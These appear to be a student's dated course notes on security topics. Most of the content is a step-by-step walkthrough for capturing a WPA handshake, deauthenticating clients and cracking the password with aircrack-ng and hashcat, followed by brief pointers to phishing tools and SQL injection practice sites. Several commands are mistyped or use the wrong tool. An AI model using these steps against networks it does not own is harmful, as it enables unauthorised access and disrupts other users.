# October 12

## Wifi hacking

### Show all interfaces

```bash
iwconfig
```
### Check if any process is holding the wifi

```bash
sudo airmon-ng check kill
```

### Start monitor mode

```bash
sudo airmon-ng start wlan0
```

### Some stuff

```bash
sudo airmon-ng wlan0mon
```

See the BSSID for ur wifi

```bash
sudo airmon-ng --bssid <BSSID> -c 2 -w capture wlan0mon
```

### Disconnecting the clients so when they try n connect again we can spoof stuff

```bash
sudo aireplay-ng -0 0 -a <TARGET-BSSID> -c <CLIENT_BSSID> wlan0mon
```

### some file will be saved

```bash
airecrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

This is one way of cracking, the other way is


# Cracking wifi Password using HashCat

## Converting the file format
By default the hashcat stuff is not installed in kali so install it

```bash
/usr/share/hashcat-utils/cap2hccapx.bin capture-01.cap capture.hccapx
```

```bash
hashcat -a 0 -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt -o capture.txt
```

Here `capture.txt` is the output file where the password will be stored.


## View the password

```bash
cat capture.txt
```


## Another way

```bash
hashcat -a 0 -m 100 top100.txt mine.txt -o passwords.txt
```

`Top100` is a list with a lot of hashes



## Phishing

Cybercriminal attempts to steal personal and financial info or infect the computers and other devices with malware and viruses.

We have `Gophish` as a tool for playing around with phishing stuff.



# October 13

### SQL, XSS, CSRA stuff

```
https://juice-shop.herokuapp.com/#/
```

Do SQL injection to login in the website.


# October 20

SQL Injection
```bash
https://tryhackme.com/room/sqlilab
```

```bash
https://247ctf.com/dashboard
```

```bash
websec.fr
```

# September 1


# September 2


# September 7

## Vulnerability Assessment using Nessus

### Advanced Scan

# September 8

# September 9

# September 14

# September 15

## Basic concepts of cryptography

# September 16

## Public and Private key encrytpion and auth

# September 21


